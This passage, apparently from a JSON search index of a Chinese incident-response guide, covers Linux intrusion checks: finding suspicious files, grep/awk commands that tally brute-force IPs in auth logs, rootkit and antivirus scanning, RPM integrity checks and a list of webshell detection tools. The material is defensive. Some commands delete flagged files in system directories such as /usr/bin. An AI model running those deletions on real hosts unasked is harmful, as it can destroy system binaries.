\u68c0\u67e5\u670d\u52a1"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#18-\u68c0\u67e5\u5f02\u5e38\u6587\u4ef6","text":"1\u3001\u67e5\u770b\u654f\u611f\u76ee\u5f55\uff0c\u5982/tmp\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u540c\u65f6\u6ce8\u610f\u9690\u85cf\u6587\u4ef6\u5939\uff0c\u4ee5\u201c..\u201d\u4e3a\u540d\u7684\u6587\u4ef6\u5939\u5177\u6709\u9690\u85cf\u5c5e\u6027 2\u3001\u5f97\u5230\u53d1\u73b0WEBSHELL\u3001\u8fdc\u63a7\u6728\u9a6c\u7684\u521b\u5efa\u65f6\u95f4\uff0c\u5982\u4f55\u627e\u51fa\u540c\u4e00\u65f6\u95f4\u8303\u56f4\u5185\u521b\u5efa\u7684\u6587\u4ef6\uff1f \u200b \u53ef\u4ee5\u4f7f\u7528find\u547d\u4ee4\u6765\u67e5\u627e\uff0c\u5982 find /opt -iname \"*\" -atime 1 -type f \u627e\u51fa /opt \u4e0b\u4e00\u5929\u524d\u8bbf\u95ee\u8fc7\u7684\u6587\u4ef6 3\u3001\u9488\u5bf9\u53ef\u7591\u6587\u4ef6\u53ef\u4ee5\u4f7f\u7528 stat \u8fdb\u884c\u521b\u5efa\u4fee\u6539\u65f6\u95f4\u3002","title":"1.8 \u68c0\u67e5\u5f02\u5e38\u6587\u4ef6"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#19-\u68c0\u67e5\u7cfb\u7edf\u65e5\u5fd7","text":"\u65e5\u5fd7\u9ed8\u8ba4\u5b58\u653e\u4f4d\u7f6e\uff1a/var/log/ \u67e5\u770b\u65e5\u5fd7\u914d\u7f6e\u60c5\u51b5\uff1amore /etc/rsyslog.conf \u65e5\u5fd7\u6587\u4ef6 \u8bf4\u660e /var/log/cron \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5b9a\u65f6\u4efb\u52a1\u76f8\u5173\u7684\u65e5\u5fd7 /var/log/cups \u8bb0\u5f55\u6253\u5370\u4fe1\u606f\u7684\u65e5\u5fd7 /var/log/dmesg \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5728\u5f00\u673a\u65f6\u5185\u6838\u81ea\u68c0\u7684\u4fe1\u606f\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528dmesg\u547d\u4ee4\u76f4\u63a5\u67e5\u770b\u5185\u6838\u81ea\u68c0\u4fe1\u606f /var/log/mailog \u8bb0\u5f55\u90ae\u4ef6\u4fe1\u606f /var/log/message \u8bb0\u5f55\u7cfb\u7edf\u91cd\u8981\u4fe1\u606f\u7684\u65e5\u5fd7\u3002\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d\u4f1a\u8bb0\u5f55Linux\u7cfb\u7edf\u7684\u7edd\u5927\u591a\u6570\u91cd\u8981\u4fe1\u606f\uff0c\u5982\u679c\u7cfb\u7edf\u51fa\u73b0\u95ee\u9898\u65f6\uff0c\u9996\u5148\u8981\u68c0\u67e5\u7684\u5c31\u5e94\u8be5\u662f\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6 /var/log/btmp \u8bb0\u5f55\u9519\u8bef\u767b\u5f55\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\u67e5\u770b\uff0c\u800c\u8981\u4f7f\u7528lastb\u547d\u4ee4\u67e5\u770b /var/log/lastlog \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u6240\u6709\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\u7684\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528lastlog\u547d\u4ee4\u67e5\u770b /var/log/wtmp \u6c38\u4e45\u8bb0\u5f55\u6240\u6709\u7528\u6237\u7684\u767b\u5f55\u3001\u6ce8\u9500\u4fe1\u606f\uff0c\u540c\u65f6\u8bb0\u5f55\u7cfb\u7edf\u7684\u542f\u52a8\u3001\u91cd\u542f\u3001\u5173\u673a\u4e8b\u4ef6\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e5f\u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u9700\u8981\u4f7f\u7528last\u547d\u4ee4\u6765\u67e5\u770b /var/log/utmp \u8bb0\u5f55\u5f53\u524d\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u968f\u7740\u7528\u6237\u7684\u767b\u5f55\u548c\u6ce8\u9500\u4e0d\u65ad\u53d8\u5316\uff0c\u53ea\u8bb0\u5f55\u5f53\u524d\u767b\u5f55\u7528\u6237\u7684\u4fe1\u606f\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4\u6765\u67e5\u8be2 /var/log/secure \u8bb0\u5f55\u9a8c\u8bc1\u548c\u6388\u6743\u65b9\u9762\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6d89\u53ca\u8d26\u53f7\u548c\u5bc6\u7801\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8bb0\u5f55\uff0c\u6bd4\u5982SSH\u767b\u5f55\uff0csu\u5207\u6362\u7528\u6237\uff0csudo\u6388\u6743\uff0c\u751a\u81f3\u6dfb\u52a0\u7528\u6237\u548c\u4fee\u6539\u7528\u6237\u5bc6\u7801\u90fd\u4f1a\u8bb0\u5f55\u5728\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d \u65e5\u5fd7\u5206\u6790\u6280\u5de7\uff1a 1\u3001\u5b9a\u4f4d\u6709\u591a\u5c11IP\u5728\u7206\u7834\u4e3b\u673a\u7684root\u5e10\u53f7\uff1a grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more \u5b9a\u4f4d\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1a grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c \u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u662f\u4ec0\u4e48\uff1f grep \"Failed password\" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 2\u3001\u767b\u5f55\u6210\u529f\u7684IP\u6709\u54ea\u4e9b\uff1a grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more \u767b\u5f55\u6210\u529f\u7684\u65e5\u671f\u3001\u7528\u6237\u540d\u3001IP\uff1a grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3\u3001\u589e\u52a0\u4e00\u4e2a\u7528\u6237kali\u65e5\u5fd7\uff1a Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep \"useradd\" /var/log/secure 4\u3001\u5220\u9664\u7528\u6237kali\u65e5\u5fd7\uff1a Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep \"userdel\" /var/log/secure 5\u3001su\u5207\u6362\u7528\u6237\uff1a Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo\u6388\u6743\u6267\u884c: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now","title":"1.9 \u68c0\u67e5\u7cfb\u7edf\u65e5\u5fd7"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#0x02-\u5de5\u5177\u7bc7","text":"","title":"0x02 \u5de5\u5177\u7bc7"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#21-rootkit\u67e5\u6740","text":"chkrootkit \u7f51\u5740\uff1a http://www.chkrootkit.org \u4f7f\u7528\u65b9\u6cd5\uff1a wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz tar zxvf chkrootkit.tar.gz cd chkrootkit-0.52 make sense #\u7f16\u8bd1\u5b8c\u6210\u6ca1\u6709\u62a5\u9519\u7684\u8bdd\u6267\u884c\u68c0\u67e5 ./chkrootkit rkhunter \u7f51\u5740\uff1a http://rkhunter.sourceforge.net \u4f7f\u7528\u65b9\u6cd5\uff1a Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz tar -zxvf rkhunter-1.4.4.tar.gz cd rkhunter-1.4.4 ./installer.sh --install rkhunter -c","title":"2.1 Rootkit\u67e5\u6740"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#22-\u75c5\u6bd2\u67e5\u6740","text":"Clamav \u7f51\u5740\uff1a http://www.clamav.net/download.html \u5b89\u88c5\u65b9\u5f0f\u4e00\uff1a 1\u3001\u5b89\u88c5 zlib\uff1a wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz tar -zxvf zlib-1.2.7.tar.gz cd zlib-1.2.7 #\u5b89\u88c5\u4e00\u4e0bgcc\u7f16\u8bd1\u73af\u5883\uff1a yum install gcc CFLAGS=\"-O3 -fPIC\" ./configure --prefix= /usr/local/zlib/ make && make install 2\u3001\u6dfb\u52a0\u7528\u6237\u7ec4 clamav \u548c\u7ec4\u6210\u5458 clamav\uff1a groupadd clamav useradd -g clamav -s /bin/false -c \"Clam AntiVirus\" clamav 3\u3001\u5b89\u88c5 Clamav tar \u2013zxvf clamav-0.97.6.tar.gz cd clamav-0.97.6 ./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib make make install 4\u3001\u914d\u7f6e Clamav mkdir /opt/clamav/logs mkdir /opt/clamav/updata touch /opt/clamav/logs/freshclam.log touch /opt/clamav/logs/clamd.log cd /opt/clamav/logs chown clamav:clamav clamd.log chown clamav:clamav freshclam.log 5\u3001ClamAV \u4f7f\u7528\uff1a /opt/clamav/bin/freshclam \u5347\u7ea7\u75c5\u6bd2\u5e93 ./clamscan \u2013h \u67e5\u770b\u76f8\u5e94\u7684\u5e2e\u52a9\u4fe1\u606f ./clamscan -r /home \u626b\u63cf\u6240\u6709\u7528\u6237\u7684\u4e3b\u76ee\u5f55\u5c31\u4f7f\u7528 ./clamscan -r --bell -i /bin \u626b\u63cfbin\u76ee\u5f55\u5e76\u4e14\u663e\u793a\u6709\u95ee\u9898\u7684\u6587\u4ef6\u7684\u626b\u63cf\u7ed3\u679c \u5b89\u88c5\u65b9\u5f0f\u4e8c\uff1a #\u5b89\u88c5 yum install -y clamav #\u66f4\u65b0\u75c5\u6bd2\u5e93 freshclam #\u626b\u63cf\u65b9\u6cd5 clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log #\u626b\u63cf\u5e76\u6740\u6bd2 clamscan -r --remove /usr/bin/bsd-port clamscan -r --remove /usr/bin/ clamscan -r --remove /usr/local/zabbix/sbin #\u67e5\u770b\u65e5\u5fd7\u53d1\u73b0 cat /root/usrclamav.log |grep FOUND","title":"2.2 \u75c5\u6bd2\u67e5\u6740"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#23-webshell\u67e5\u6740","text":"Linux \u7248\uff1a \u6cb3\u9a6c WebShell \u67e5\u6740\uff1ahttp://www.shellpub.com","title":"2.3 webshell\u67e5\u6740"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#24-rpm-check-\u68c0\u67e5","text":"\u7cfb\u7edf\u5b8c\u6574\u6027\u53ef\u4ee5\u901a\u8fc7rpm\u81ea\u5e26\u7684-Va\u6765\u6821\u9a8c\u68c0\u67e5\u6240\u6709\u7684rpm\u8f6f\u4ef6\u5305\uff0c\u67e5\u770b\u54ea\u4e9b\u547d\u4ee4\u662f\u5426\u88ab\u66ff\u6362\u4e86\uff1a ./rpm -Va > rpm.log \u5982\u679c\u4e00\u5207\u5747\u6821\u9a8c\u6b63\u5e38\u5c06\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u8f93\u51fa\uff0c\u5982\u679c\u6709\u4e0d\u4e00\u81f4\u7684\u5730\u65b9\uff0c\u5c31\u4f1a\u663e\u793a\u51fa\u6765\uff0c\u8f93\u51fa\u683c\u5f0f\u662f8\u4f4d\u957f\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e2a\u5b57\u7b26\u90fd\u7528\u4ee5\u8868\u793a\u6587\u4ef6\u4e0eRPM\u6570\u636e\u5e93\u4e2d\u4e00\u79cd\u5c5e\u6027\u7684\u6bd4\u8f83\u7ed3\u679c \uff0c\u5982\u679c\u662f. (\u70b9) \u5219\u8868\u793a\u6d4b\u8bd5\u901a\u8fc7\u3002 \u9a8c\u8bc1\u5185\u5bb9\u4e2d\u76848\u4e2a\u4fe1\u606f\u7684\u5177\u4f53\u5185\u5bb9\u5982\u4e0b\uff1a S \u6587\u4ef6\u5927\u5c0f\u662f\u5426\u6539\u53d8 M \u6587\u4ef6\u7684\u7c7b\u578b\u6216\u6587\u4ef6\u7684\u6743\u9650\uff08rwx\uff09\u662f\u5426\u88ab\u6539\u53d8 5 \u6587\u4ef6MD5\u6821\u9a8c\u662f\u5426\u6539\u53d8\uff08\u53ef\u4ee5\u770b\u6210\u6587\u4ef6\u5185\u5bb9\u662f\u5426\u6539\u53d8\uff09 D \u8bbe\u5907\u4e2d\uff0c\u4ece\u4ee3\u7801\u662f\u5426\u6539\u53d8 L \u6587\u4ef6\u8def\u5f84\u662f\u5426\u6539\u53d8 U \u6587\u4ef6\u7684\u5c5e\u4e3b\uff08\u6240\u6709\u8005\uff09\u662f\u5426\u6539\u53d8 G \u6587\u4ef6\u7684\u5c5e\u7ec4\u662f\u5426\u6539\u53d8 T \u6587\u4ef6\u7684\u4fee\u6539\u65f6\u95f4\u662f\u5426\u6539\u53d8 \u5982\u679c\u547d\u4ee4\u88ab\u66ff\u6362\u4e86\uff0c\u5982\u679c\u8fd8\u539f\u56de\u6765\uff1a \u6587\u4ef6\u63d0\u53d6\u8fd8\u539f\u6848\u4f8b\uff1a rpm -qf /bin/ls \u67e5\u8be2 ls \u547d\u4ee4\u5c5e\u4e8e\u54ea\u4e2a\u8f6f\u4ef6\u5305 mv /bin/ls /tmp \u5148\u628a ls \u8f6c\u79fb\u5230 tmp \u76ee\u5f55\u4e0b\uff0c\u9020\u6210 ls \u547d\u4ee4\u4e22\u5931\u7684\u5047\u8c61 rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls \u63d0\u53d6 rpm \u5305\u4e2d ls \u547d\u4ee4\u5230\u5f53\u524d\u76ee\u5f55\u7684 /bin/ls \u4e0b cp /root/bin/ls /bin/ \u628a ls \u547d\u4ee4\u590d\u5236\u5230 /bin/ \u76ee\u5f55 \u4fee\u590d\u6587\u4ef6\u4e22\u5931","title":"2.4 RPM check \u68c0\u67e5"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#25-linux\u5b89\u5168\u68c0\u67e5\u811a\u672c","text":"Github \u9879\u76ee\u5730\u5740\uff1a https://github.com/grayddq/GScan https://github.com/ppabc/security_check https://github.com/T0xst/linux \u5c3d\u4fe1\u4e66\u4e0d\u5982\u65e0\u4e66\uff0c\u5de5\u5177\u53ea\u662f\u8f85\u52a9\uff0c\u522b\u592a\u8fc7\u4e8e\u4f9d\u8d56\uff0c\u5173\u952e\u5728\u4e8e\u4f60\u5982\u4f55\u89e3\u51b3\u95ee\u9898\u7684\u601d\u8def\u3002","title":"2.5 Linux\u5b89\u5168\u68c0\u67e5\u811a\u672c"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E7%9A%84%20Webshell%20%E6%9F%A5%E6%9D%80%E5%B7%A5%E5%85%B7/","text":"\u7b2c3\u7bc7\uff1a\u5e38\u89c1\u7684 Webshell \u67e5\u6740\u5de5\u5177 \u00b6 \u524d\u8a00 \u00b6 \u5f53\u7f51\u7ad9\u670d\u52a1\u5668\u88ab\u5165\u4fb5\u65f6\uff0c\u6211\u4eec\u9700\u8981\u4e00\u6b3eWebshell\u68c0\u6d4b\u5de5\u5177\uff0c\u6765\u5e2e\u52a9\u6211\u4eec\u53d1\u73b0webshell\uff0c\u8fdb\u4e00\u6b65\u6392\u67e5\u7cfb\u7edf\u53ef\u80fd\u5b58\u5728\u7684\u5b89\u5168\u6f0f\u6d1e\u3002 \u672c\u6587\u63a8\u8350\u4e8610\u6b3e WebShll \u68c0\u6d4b\u5de5\u5177\uff0c\u7528\u4e8e\u7f51\u7ad9\u5165\u4fb5\u6392\u67e5\u3002\u5f53\u7136\uff0c\u76ee\u524d\u5e02\u573a\u4e0a\u7684\u5f88\u591a\u4e3b\u673a\u5b89\u5168\u4ea7\u54c1\u4e5f\u90fd\u63d0\u4f9b\u8fd9\u79cd WebShell \u68c0\u6d4b\u80fd\u529b\uff0c\u6bd4\u5982\u963f\u91cc\u4e91\u3001\u9752\u85e4\u4e91\u3001safedog \u7b49\uff0c\u672c\u6587\u6682\u4e0d\u8ba8\u8bba\u3002 1\u3001D\u76fe_Web\u67e5\u6740 \u963fD\u51fa\u54c1\uff0c\u4f7f\u7528\u81ea\u884c\u7814\u53d1\u4e0d\u5206\u6269\u5c55\u540d\u7684\u4ee3\u7801\u5206\u6790\u5f15\u64ce\uff0c\u80fd\u5206\u6790\u66f4\u4e3a\u9690\u85cf\u7684 WebShell \u540e\u95e8\u884c\u4e3a\u3002 \u517c\u5bb9\u6027\uff1a\u53ea\u63d0\u4f9b Windows \u7248\u672c\u3002 \u5de5\u5177\u4e0b\u8f7d\u5730\u5740\uff1a http://www.d99net.net 2\u3001\u767e\u5ea6 WEBDIR+ \u4e0b\u4e00\u4ee3 WebShell \u68c0\u6d4b\u5f15\u64ce\uff0c\u91c7\u7528\u5148\u8fdb\u7684\u52a8\u6001\u76d1\u6d4b\u6280\u672f\uff0c\u7ed3\u5408\u591a\u79cd\u5f15\u64ce\u96f6\u89c4\u5219\u67e5\u6740\u3002 \u517c\u5bb9\u6027\uff1a\u63d0\u4f9b\u5728\u7ebf\u67e5\u6740\u6728\u9a6c\uff0c\u514d\u8d39\u5f00\u653e API \u652f\u6301\u6279\u91cf\u68c0\u6d4b\u3002 \u5728\u7ebf\u67e5\u6740\u5730\u5740\uff1a https://scanner.baidu.com 3\u3001\u6cb3\u9a6c \u4e13\u6ce8 WebShell \u67e5\u6740\u7814\u7a76\uff0c\u62e5\u6709\u6d77\u91cf WebShell \u6837\u672c\u548c\u81ea\u4e3b\u67e5\u6740\u6280\u672f\uff0c\u91c7\u7528\u4f20\u7edf\u7279\u5f81+\u4e91\u7aef\u5927\u6570\u636e\u53cc\u5f15\u64ce\u7684\u67e5\u6740\u6280\u672f\u3002\u67e5\u6740\u901f\u5ea6\u5feb\u3001\u7cbe\u5ea6\u9ad8\u3001\u8bef\u62a5\u4f4e\u3002 \u517c\u5bb9\u6027\uff1a\u652f\u6301 Windows\u3001Linux\uff0c\u652f\u6301\u5728\u7ebf\u67e5\u6740\u3002 \u5b98\u65b9\u7f51\u7ad9\uff1a https://www.shellpub.com 4\u3001Web Shell Detector Web Shell Detector \u5177\u6709 WebShell \u7b7e\u540d\u6570\u636e\u5e93\uff0c\u53ef\u5e2e\u52a9\u8bc6\u522b\u9ad8\u8fbe 99\uff05 \u7684 WebShell\u3002 \u517c\u5bb9\u6027\uff1a\u63d0\u4f9b PHP\u3001Python \u811a\u672c\uff0c\u53ef\u8de8\u5e73\u53f0\uff0c\u5728\u7ebf\u68c0\u6d4b\u3002 \u5b98\u65b9\u7f51\u7ad9\uff1a http://www.shelldetector.com github\u9879\u76ee\u5730\u5740\uff1a https://github.com/emposha/PHP-Shell-Detector 5\u3001CloudWalker\uff08\u7267\u4e91\uff09 \u4e00\u4e2a\u53ef\u6267\u884c\u7684\u547d\u4ee4\u884c\u7248\u672c Webshell \u68c0\u6d4b\u5de5\u5177\u3002\u76ee\u524d\uff0c\u9879\u76ee\u5df2\u505c\u6b62\u66f4\u65b0\u3002 \u517c\u5bb9\u6027\uff1a\u63d0\u4f9b Linux\u7248\u672c\uff0cWindows \u6682\u4e0d\u652f\u6301\u3002 \u5728\u7ebf\u67e5\u6740 demo\uff1a https://webshellchop.chaitin.cn GitHub \u9879\u76ee\u5730\u5740\uff1a https://github.com/chaitin/cloudwalker 6\u3001Sangfor WebShellKill Sangfor WebShellKill (\u7f51\u7ad9\u540e\u95e8\u68c0\u6d4b\u5de5\u5177)\u662f\u4e00\u6b3e Web \u540e\u95e8\u4e13\u6740\u5de5\u5177\uff0c\u4e0d\u4ec5\u652f\u6301 WebShell \u7684\u626b\u63cf\uff0c\u540c\u65f6\u8fd8\u652f\u6301\u6697\u94fe\u7684\u626b\u63cf\u3002\u662f\u4e00\u6b3e\u878d\u5408\u4e86\u591a\u91cd\u68c0\u6d4b\u5f15\u64ce\u7684\u67e5\u6740\u5de5\u5177\u3002\u80fd\u66f4\u7cbe\u51c6\u5730\u68c0\u6d4b\u51faWEB\u7f51\u7ad9\u5df2\u77e5\u548c\u672a\u77e5\u7684\u540e\u95e8\u6587\u4ef6\u3002 \u517c\u5bb9\u6027\uff1a\u652f\u6301 Windows\u3001linux \u5de5\u5177\u4e0b\u8f7d\u5730\u5740\uff1a http://edr.sangfor.com.cn/backdoor_detection.html \uff08\u5df2\u505c\u6b62\u8bbf\u95ee\uff09 7\u3001\u6df1\u5ea6\u5b66\u4e60\u6a21\u578b\u68c0\u6d4b PHP Webshell \u4e00\u4e2a\u6df1\u5ea6\u5b66\u4e60 PHP WebShell \u67e5\u6740\u5f15\u64ce demo\uff0c\u63d0\u4f9b\u5728\u7ebf\u6837\u672c\u68c0\u6d4b\u3002 \u5728\u7ebf\u67e5\u6740\u5730\u5740\uff1a http://webshell.cdxy.me 8\u3001PHP Malware Finder PHP-malware-finder \u662f\u4e00\u6b3e\u4f18\u79c0\u7684\u68c0\u6d4bwebshell\u548c\u6076\u610f\u8f6f\u4ef6\u6df7\u6dc6\u4ee3\u7801\u7684\u5de5\u5177 \u517c\u5bb9\u6027\uff1a\u63d0\u4f9bLinux \u7248\u672c\uff0cWindows \u6682\u4e0d\u652f\u6301\u3002 GitHub \u9879\u76ee\u5730\u5740\uff1a https://github.com/jvoisin/php-malware-finder 9\u3001findWebshell \u8fd9\u4e2a\u9879\u76ee\u662f\u4e00\u6b3e\u57fa\u4e8e Python \u5f00\u53d1\u7684 WebShell \u68c0\u67e5\u5de5\u5177\uff0c\u53ef\u4ee5\u6839\u636e\u7279\u5f81\u7801\u5339\u914d\u68c0\u67e5\u4efb\u610f\u7c7b\u578b\u7684 WebShell \u540e\u95e8\u3002 GitHub \u9879\u76ee\u5730\u5740\uff1a https://github.com/he1m4n6a/findWebshell 10\u3001\u5728\u7ebf WebShell \u67e5\u6740\u5de5\u5177 \u5728\u7ebf\u67e5\u6740\u5730\u5740\uff1a http://tools.bugscaner.com/killwebshell","title":"\u7b2c3\u7bc7\uff1a\u5e38\u89c1\u7684 Webshell \u67e5\u6740\u5de5\u5177"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E7%9A%84%20Webshell%20%E6%9F%A5%E6%9D%80%E5%B7%A5%E5%85%B7/#\u7b2c3\u7bc7\u5e38\u89c1\u7684-webshell-\u67e5\u6740\u5de5\u5177","text":"","title":"\u7b2c3\u7bc7\uff1a\u5e38\u89c1\u7684 Webshell \u67e5\u6740\u5de5\u5177"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E7%9A%84%20Webshell%20%E6%9F%A5%E6%9D%80%E5%B7%A5%E5%85%B7/#\u524d\u8a00","text":"\u5f53\u7f51\u7ad9\u670d\u52a1\u5668\u88ab\u5165\u4fb5\u65f6\uff0c\u6211\u4eec\u9700\u8981\u4e00\u6b3eWebshell\u68c0\u6d4b\u5de5\u5177\uff0c\u6765\u5e2e\u52a9\u6211\u4eec\u53d1\u73b0webshell\uff0c\u8fdb\u4e00\u6b65\u6392\u67e5\u7cfb\u7edf\u53ef\u80fd\u5b58\u5728\u7684\u5b89\u5168\u6f0f\u6d1e\u3002 \u672c\u6587\u63a8\u8350\u4e8610\u6b3e WebShll \u68c0\u6d4b\u5de5\u5177\uff0c\u7528\u4e8e\u7f51\u7ad9\u5165\u4fb5\u6392\u67e5\u3002\u5f53\u7136\uff0c\u76ee\u524d\u5e02\u573a\u4e0a\u7684\u5f88\u591a\u4e3b\u673a\u5b89\u5168\u4ea7\u54c1\u4e5f\u90fd\u63d0\u4f9b\u8fd9\u79cd WebShell \u68c0\u6d4b\u80fd\u529b\uff0c\u6bd4\u5982\u963f\u91cc\u4e91\u3001\u9752\u85e4\u4e91\u3001safedog \u7b49\uff0c\u672c\u6587\u6682\u4e0d\u8ba8\u8bba\u3002 1\u3001D\u76fe_Web\u67e5\u6740 \u963fD\u51fa\u54c1\uff0c\u4f7f\u7528\u81ea\u884c\u7814\u53d1\u4e0d\u5206\u6269\u5c55\u540d\u7684\u4ee3\u7801\u5206\u6790\u5f15\u64ce\uff0c\u80fd\u5206\u6790\u66f4\u4e3a\u9690\u85cf\u7684 WebShell \u540e\u95e8\u884c\u4e3a\u3002 \u517c\u5bb9\u6027\uff1a\u53ea\u63d0\u4f9b Windows \u7248\u672c\u3002 \u5de5\u5177\u4e0b\u8f7d\u5730\u5740\uff1a http://www.d99net.net 2\u3001\u767e\u5ea6 WEBDIR+ \u4e0b\u4e00\u4ee3 WebShell 